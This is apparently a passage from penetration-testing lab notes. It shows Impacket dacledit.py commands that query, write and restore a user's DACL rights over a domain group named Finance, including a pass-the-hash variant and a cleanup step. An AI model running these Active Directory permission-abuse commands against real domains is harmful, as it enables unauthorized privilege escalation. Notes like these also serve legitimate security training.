
```shell
dacledit.py -principal <USER> -target "<GROUP>" -dc-ip <TARGET-IP> DOMAIN.local/<USER>:<PASSWORD>
```
<img width="1893" height="423" alt="Pasted image 20251230130204" src="https://github.com/user-attachments/assets/051a1a94-9ee4-46b7-9e7f-4d9d78c5d926" />
#### Modifying Luna's DACLs over the Finance group
```shell
dacledit.py -principal <USER> -target "<GROUP>" -dc-ip <TARGET-IP> DOMAIN.local/<USER>:<PASSWORD> -action write
```

<img width="1891" height="259" alt="Pasted image 20251230130231" src="https://github.com/user-attachments/assets/cb639ee3-9f9a-45a0-8e10-7988f69953ce" />
**Example using hashes**:
```shell
dacledit.py -principal <USER> -target "<GROUP>" -dc-ip <TARGET-IP> DOMAIN.local/<USER> -hashes :fa61a89e878f8688afb10b515a4866c7 -action write
```
#### Querying Luna's DACLs over the Finance Group after Modification
```shell
dacledit.py -principal <USER> -target "<GROUP>" -dc-ip <TARGET-IP> DOMAIN.local/<USER>:<PASSWORD>
```
<img width="1896" height="562" alt="Pasted image 20251230130323" src="https://github.com/user-attachments/assets/3188cd41-3087-4662-bd76-b9cc081b9af6" />
#### Restoring the DACL using the Backup File
like cleaning up
```shell
dacledit.py -principal <USER> -target "<GROUP>" -dc-ip <TARGET-IP> DOMAIN.local/<USER>:<PASSWORD> -action restore -file dacledit-20230524-211441.bak
```
